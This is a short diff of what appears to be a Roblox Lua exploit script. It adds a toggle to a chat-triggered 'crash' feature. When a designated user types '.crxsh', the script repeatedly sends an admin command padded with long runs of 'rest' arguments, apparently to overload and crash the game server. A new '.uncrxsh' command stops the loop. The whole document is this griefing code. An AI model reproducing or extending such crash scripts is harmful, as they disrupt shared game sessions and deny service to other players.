@@ -101,12 +101,21 @@ end)
 user_premium__001.Chatted:Connect(function(cht)
     if cht:match(".crxsh") then
         if game.Players.LocalPlayer then
-            while true do
+        loopCrash = true
+            while loopCrash do
                 game.Players:Chat(";bkit rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest rest")
                 wait(21)
             end
         end
     end
+end)
+
+user_premium__001.Chatted:Connect(function(cht)
+    if cht:match(".uncrxsh") then
+        if game.Players.LocalPlayer then
+     loopCrash = false
+            end
+        end
 end)
 
 user_premium__001.Chatted:connect(function(cht)
